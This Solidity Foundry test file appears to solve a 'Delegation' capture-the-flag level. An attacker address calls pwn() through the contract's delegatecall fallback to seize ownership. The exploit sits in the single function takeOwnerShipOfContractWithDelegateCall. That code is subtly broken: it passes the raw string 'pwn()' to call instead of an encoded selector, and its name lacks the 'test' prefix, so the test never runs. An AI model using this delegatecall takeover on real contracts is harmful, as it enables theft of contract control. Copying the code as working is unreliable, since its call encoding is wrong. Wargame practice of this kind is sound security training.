
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Delegate, Delegation} from "../src/Delegation.sol";
import {DeployDelegation} from "../script/DeployDelegation.s.sol";

contract DelegationTest is Test{

    Delegate delegate;
    Delegation delegation;
    DeployDelegation deployer;

    address public ownerOfDelegateContract = makeAddr("ownerOfDelegate");
    address public ownerOfDelegationContract = makeAddr("ownerOfDelegation");
    address public attacker = makeAddr("attacker");


    function setUp() public {
        deployer = new DeployDelegation();
        (delegate, delegation) = deployer.run();
    }

    function takeOwnerShipOfContractWithDelegateCall() public {
        vm.startPrank(ownerOfDelegationContract);
        assertEq(ownerOfDelegationContract, delegation.owner());
        vm.stopPrank();

        vm.startPrank(attacker);
        (bool success, ) = address(delegation).call("pwn()");
        require(success, "Low Level Call Failed!");
        assertEq(attacker, delegation.owner());
        vm.stopPrank();
    }

}